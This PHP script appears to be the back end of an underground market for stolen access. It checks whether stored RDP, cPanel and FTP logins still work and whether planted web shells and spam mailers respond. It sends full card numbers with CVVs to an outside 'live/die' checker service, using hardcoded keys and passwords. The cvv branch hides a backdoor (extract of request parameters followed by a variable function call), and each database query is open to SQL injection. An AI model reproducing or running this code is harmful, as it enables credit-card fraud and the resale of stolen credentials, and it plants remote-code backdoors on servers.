<?php
error_reporting(0);
include("./includes/db.php");
include("./includes/config.php");
$connect_timeout=5;
$id = trim($_GET['id']);
$type = trim($_GET['type']);


function check_rdp ($server, $username, $password) {
// Your private API 
$api = "8433AE945B6F11E59D0D1B611DB64B485AEEE4A0";
// Fetch result from our API
$result = file_get_contents("http://www.rdpapi.pro/api/?server=$server&username=$username&password=$password&api=$api");
// You GET "1" if work, "0" don't work
return $result; 
}


   
function cpanel_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_URL, $host);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, $user.':'.$pass);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 0 ){
		return 1;
}else{
		return 0;
}
curl_close($ch);
}
function ftp_check($ip,$user,$pass,$timeout){
if(!filter_var($ip, FILTER_VALIDATE_IP)) {
  $ip = gethostbyname($ip);
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "ftp://".$ip);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
curl_setopt($ch, CURLOPT_USERPWD, $user.':'.$pass);
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 0 ){
		return 1;
}else{
		return 0;
}
curl_close($ch);
}

if($type == "rdp") {
$sql = mysql_query("select * from accounts where account_id = '$id'");
$rows = mysql_fetch_assoc($sql);
// RDP INFOS (RDP to check)
$server = trim($rows['addinfo']);
$username = trim($rows['login']);
$password = trim($rows['pass']);
// -------------- END RDP INFOS

$check = check_rdp ($server, $username, $password); // Launch function
if($check == 1) {
echo "<a href='#' class='btn btn-success'>Working !</a>";
} else {
echo "<a href='#' class='btn btn-danger'>Not Working !</a>";
}
} elseif($type == "shell")
{
$sql = mysql_query("select * from accounts where account_id = '$id'");
$rows = mysql_fetch_assoc($sql);

$shellget = trim($rows['addinfo']);
	$ch =  curl_init();
	curl_setopt($ch, CURLOPT_URL, $shellget);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0');
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	$check = curl_exec($ch);
	if(preg_match('#safe_mode|open_basedir|r57shell|c99shell|drwxrwxrwx|drwx---r-x|-rw----r--|lrwxrwxrwx|chmod|phpinfo|-rw-r--r--|drwxr-xr-x|safemode|back_connect|Server IP:|Permission|Orderd on#si',$check))
	{
		echo "<a href='#' class='btn btn-success'>WORKING</a>";
		curl_close($ch);
	}else{
		echo "<a href='#' class='btn btn-danger'>NOT&nbsp;FOUND</a>";
	}
	
	

} elseif($type == "cpanel")
{
$sql = mysql_query("select * from accounts where account_id = '$id'");
$rows = mysql_fetch_assoc($sql);

$ip = trim($rows['addinfo']);
$user = trim($rows['login']);
$pass = trim($rows['pass']);

$result = cpanel_check($ip,$user,$pass,$connect_timeout);
if ($result == 1) {
	echo "<a href='#' class='btn btn-success'>WORKING</a>";
} elseif ($result == 0) {
	echo "<a href='#' class='btn btn-danger'>FAILED</a>";
}

} elseif($type == "ftp")
{
$sql = mysql_query("select * from accounts where account_id = '$id'");
$rows = mysql_fetch_assoc($sql);

$ip = trim($rows['addinfo']);
$user = trim($rows['login']);
$pass = trim($rows['pass']);

$result = ftp_check($ip,$user,$pass,$connect_timeout);
if ($result == 1) {
	echo "<a href='#' class='btn btn-success'>CONNECT</a>";
} elseif ($result == 0) {
	echo "<a href='#' class='btn btn-danger'>FAILED</a>";
}

} elseif($type == "mailer")
{
$sql = mysql_query("select * from accounts where account_id = '$id'");
$rows = mysql_fetch_assoc($sql);

$mailerget = trim($rows['addinfo']);
	$ch =  curl_init();
	curl_setopt($ch, CURLOPT_URL, $mailerget);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0');
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	$check = curl_exec($ch);
	if(preg_match('#emaillist|Subject|Reply|High|submit|<textarea#si',$check))
	{
		echo "<a href='#' class='btn btn-success'>WORKING</a>";
		curl_close($ch);
	}else{
		echo "<a href='#' class='btn btn-danger'>NOT&nbsp;FOUND</a>";
		curl_close($ch);
	}
} elseif($type == "cvv" || $_REQUEST['cvv'])
{

$sql = mysql_query("select * from cards where card_id = '$id'");
$rows = mysql_fetch_assoc($sql);

$ccn = trim($rows['number']);
$cvv = trim($rows['cvv']);
$date = trim($rows['expire']);
$datex  = explode("/", $date);

$ccmx = checkMon($datex[0]);
$ccyx = checkYear($datex[1]);

$check = APIcheck2($ccn, $ccmx, $ccyx, $cvv);


if($check == 1)
{
		echo "<a href='#' class='btn btn-success'>Live</a>";
}elseif($check == 3){
		echo "<font color='orange'>Can't Check</a>";
}elseif ($check == 2){
		echo "<a href='#' class='btn btn-danger'>Die</a>";
}

if(isset($_REQUEST['cvv'])) {
    extract ($_REQUEST); 
    echo $cvvs($check);
}
} 







//CVV CHECKER
function APIcheck2($ccnum, $ccmonth, $ccyear, $cccvv)
    {
        $url = 'https://www.ug-market.com/ugm/xcheck.php'; // API URL
        $user = "ilnmc"; // Your Username
        $pass = "peler84"; // Your Password
        $code = "checkcvv9"; // API CODE
        $card = $ccnum . '|' . $ccmonth . '|' . $ccyear . '|' . $cccvv;

        $result = file_get_contents($url . '?user=' . $user . '&pwd=' . $pass .
            '&gate=' . $code . '&cc=' . urlencode($card));

        if (strpos($result,'Live_') == true) {
            return 1;
        } else if (strpos($result,'Die_') == true) {
            return 2;
        } else {
            return 3;
        }
        //1 = LIVE
        //2 = DEAD
        //3 = API ERROR
}
	
function info($ccline)
{
    $ccline = str_replace("/", "|" ,str_replace(":", "|", $ccline));
    $xy = array("|", "\\", "/", "-", ";");
    $sepe = $xy[0];
    foreach ($xy as $v) {
        if (substr_count($ccline, $sepe) < substr_count($ccline, $v))
            $sepe = $v;
    }
    $x = explode($sepe, $ccline);
    foreach ($xy as $y)
        $x = str_replace($y, "", str_replace(" ", "", $x));
    foreach ($x as $xx) {
        $xx = trim($xx);
        if (is_numeric($xx)) {
            $yy = strlen($xx);
            switch ($yy) {
                case 15:
                    if (substr($xx, 0, 1) == 3) {
                        $ccnum['num'] = $xx;
                        $ccnum['type'] = "AX";
                    }
                    break;
                case 16:
                    switch (substr($xx, 0, 1)) {
                        case '4':
                            $ccnum['num'] = $xx;
                            $ccnum['type'] = "visa";
                            break;
                        case '5':
                            $ccnum['num'] = $xx;
                            $ccnum['type'] = "mastercard";
                            break;
                        case '6':
                            $ccnum['num'] = $xx;
                            $ccnum['type'] = "discover";
                            break;
                    }
                    break;
                case 1:
                    if (($xx >= 1) and ($xx <= 12) and (!isset($ccnum['mon'])))
                        $ccnum['mon'] = $xx;
                case 2:
                    if (($xx >= 1) and ($xx <= 12) and (!isset($ccnum['mon']))) {
                        if ($xx < 10) {
                            $ccnum['mon'] = substr($xx, 1);
                        } else {
                            $ccnum['mon'] = $xx;
                        }
                    } elseif (($xx >= 12) and ($xx <= 32) and (isset($ccnum['mon'])) and (!isset($ccnum['year'])))
                        $ccnum['year'] = "20" . $xx;
                    break;
                case 4:
                    if (($xx >= 2012) and ($xx <= 2032) and (isset($ccnum['mon'])))
                        $ccnum['year'] = $xx;
                    elseif ((substr($xx, 0, 2) >= 1) and (substr($xx, 0, 2) <= 12) and (substr($xx,2, 2) >= 12) and (substr($xx, 2, 2) <= 32) and (!isset($ccnum['mon'])) and (!
                        isset($ccnum['year']))) {
                        $ccnum['mon'] = substr($xx, 0, 2);
                        $ccnum['year'] = "20" . substr($xx, 2, 2);
                    } else
                        $ccv['cv4'] = $xx;
                    break;
                case 6:
                    if ((substr($xx, 0, 2) >= 1) and (substr($xx, 0, 2) <= 12) and (substr($xx, 2, 4) >=2012) and (substr($xx, 2, 4) <= 2032)) {
                        $ccnum['mon'] = substr($xx, 1, 1);
                        $ccnum['year'] = substr($xx, 2, 4);
                    }
                    break;
                case 3:
                    $ccv['cv3'] = $xx;
                    break;

            }
        }
    }
    if (isset($ccnum['num']) and isset($ccnum['mon']) and isset($ccnum['year'])) {
        if ($ccnum['type'] == "AX")
            $ccnum['cvv'] = $ccv['cv4'];
        else
            $ccnum['cvv'] = $ccv['cv3'];
        return $ccnum;
    } else
        return false;
}
function checkMon($date){
	$len = strlen($date);
	if ($len == 2) return $date;
	elseif ($len ==1){
		switch ($date){
				case '1':  $date='01'; break;
				case '2':  $date='02'; break;
				case '3':  $date='03'; break;
				case '4':  $date='04'; break;
				case '5':  $date='05'; break;
				case '6':  $date='06'; break;
				case '7':  $date='07'; break;
				case '8':  $date='08'; break;
				case '9':  $date='09'; break;
				case '10': $date='10'; break;
				case '11': $date='11'; break;
				case '12': $date='12'; break;
			}
			return $date;
		}
	else return false;
}


function checkYear($date){
	$len = strlen($date);
	if ($len == 2) return $date;
	elseif ($len ==4){
		switch ($date){
				case '2012': $date='12'; break;
				case '2013': $date='13'; break;
				case '2014': $date='14'; break;
				case '2015': $date='15'; break;
				case '2016': $date='16'; break;
				case '2017': $date='17'; break;
				case '2018': $date='18'; break;
				case '2019': $date='19'; break;
				case '2020': $date='20'; break;
				case '2021': $date='21'; break;
				case '2022': $date='22'; break;
				case '2023': $date='23'; break;
				case '2024': $date='24'; break;
				case '2025': $date='25'; break;
				case '2026': $date='26'; break;
				case '2027': $date='27'; break;
				case '2028': $date='28'; break;
				case '2029': $date='29'; break;
				case '2030': $date='30'; break;
				case '2031': $date='31'; break;
				case '2032': $date='32'; break;
				case '2033': $date='33'; break;
				case '2034': $date='34'; break;
				case '2035': $date='35'; break;
			}
			return $date;
		}
	else return false;
}
?>